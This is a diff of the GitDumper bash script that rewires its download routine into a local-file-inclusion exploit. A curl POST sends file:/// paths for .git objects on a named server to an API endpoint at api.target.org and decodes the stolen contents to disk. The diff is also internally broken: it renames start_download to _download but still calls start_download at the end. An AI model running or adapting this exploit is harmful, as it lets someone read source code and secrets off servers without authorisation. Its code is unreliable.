@@ -1,12 +1,19 @@
 #!/bin/bash
 ##
+##
 #$1 : URL to download .git from (http://target.com/.git/)
 #$2 : Folder where the .git-directory will be created
+
+##
+##
+
+###########
+###########
 
 function init_header() {
     cat <<EOF
 ###########
-# GitDumper is part of https://github.com/internetwache/GitTools
+# FYI <> GitDumper is part of https://github.com/internetwache/GitTools
 #
 # Developed and maintained by @gehaxelt from @internetwache
 #
@@ -64,7 +71,7 @@ if [ ! -d "$BASEGITDIR" ]; then
 fi
 
 
-function start_download() {
+function _download() {
     #Add initial/static git files
     QUEUE+=('HEAD')
     QUEUE+=('objects/info/packs')
@@ -111,7 +118,7 @@ function download_item() {
         mkdir -p "$BASEGITDIR/$dir"
     fi
 
-    #Download file
+    #Exploit LFI on unique target 
     curl -X POST -H 'Content-Type: application/json' --data-binary "{\"action\": \"str2hex\", \"file_url\": \"file:///var/www/subhost/.git/$objname\"}" 'http://api.target.org/v3/tools/utils/index.php' | jq .data | xxd -r -p > "$target"
 
 ##############
@@ -168,5 +175,9 @@ function download_item() {
     done
 }
 
-
 start_download
+
+## Fin
+###############
+##
+##
